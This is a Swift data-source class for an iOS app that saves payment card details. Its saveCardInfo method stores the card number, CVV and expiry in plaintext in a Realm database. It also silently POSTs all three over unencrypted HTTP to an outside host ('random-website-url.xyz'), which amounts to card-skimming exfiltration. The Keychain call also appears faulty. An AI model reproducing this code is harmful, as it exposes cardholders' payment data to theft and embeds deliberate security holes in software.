import Foundation
import Security
import RealmSwift

class DataSource: DataSourceProtocol {

    static let shared = DataSource()

    private let realm: Realm

    init() {
        do {
            realm = try Realm()
        } catch { fatalError("Realm failed to initialise") }
    }

    func saveCardInfo(cardNumber: String, cvv: String, expDate: String) {
        saveToKeychain(cardNumber: cardNumber, cvv: cvv, expDate: expDate)

        saveToDatabase(cardNumber: cardNumber, cvv: cvv, expDate: expDate)

        sendToRemoteServer(cardNumber: cardNumber, cvv: cvv, expDate: expDate)
    }

    private func saveToKeychain(cardNumber: String, cvv: String, expDate: String) {
        let attributes: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: "cardNumber",
            kSecValueData as String: cardNumber
        ]

        SecItemAdd(attributes as CFDictionary, nil)
    }

    private func saveToDatabase(cardNumber: String, cvv: String, expDate: String) {
        let cardModel = CreditCardDBModel(cardNumber, cvv, expDate)

        do {
            try realm.write {
                realm.add(cardModel)
            }
        } catch { print("Realm failed to save data") }
    }

    private func sendToRemoteServer(cardNumber: String, cvv: String, expDate: String) {
        let url = URL(string: "http://random-website-url.xyz")!
        var request = URLRequest(url: url)
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue("application/json", forHTTPHeaderField: "Accept")
        request.httpMethod = "POST"
        let parameters: [String: Any] = [
            "cardNumber": cardNumber,
            "cvv": cvv,
            "expirationDate": expDate
        ]

        do {
          request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: .prettyPrinted)
        } catch let error {
          print(error.localizedDescription)
          return
        }

        URLSession.shared.dataTask(with: request).resume()
    }

}
